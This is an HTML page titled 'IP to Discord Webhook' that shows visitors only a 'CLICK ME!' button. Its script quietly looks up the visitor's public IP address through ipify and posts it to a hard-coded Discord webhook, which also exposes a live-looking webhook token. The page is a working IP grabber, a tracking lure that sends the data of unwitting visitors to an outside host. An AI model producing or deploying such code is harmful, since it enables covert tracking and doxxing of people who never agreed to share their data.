<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP to Discord Webhook</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: black;
        }
        #clickMeBtn {
            padding: 20px 40px;
            font-size: 24px;
            color: white;
            background-color: green;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        #clickMeBtn:hover {
            background-color: darkgreen;
        }
    </style>
</head>
<body>
    <button id="clickMeBtn">CLICK ME!</button>

    <script>
        document.getElementById('clickMeBtn').addEventListener('click', function() {
            // Get the IP address using ipify
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    // Send the IP address to the Discord webhook
                    const webhookUrl = 'https://discord.com/api/webhooks/1236739657505439854/xrWrzCfXnGaQ_TcMO7xXVMUw5LZU6k_fRuEIplzFBaGTB9R7hc4YJC579feuU1UqRNWx';
                    const message = {
                        content: `User IP: ${ip}`
                    };
                    
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    })
                    .catch(error => {
                        console.error('Error sending IP to Discord webhook:', error);
                    });
                })
                .catch(error => {
                    console.error('Error fetching IP:', error);
                });
        });
    </script>
</body>
</html>
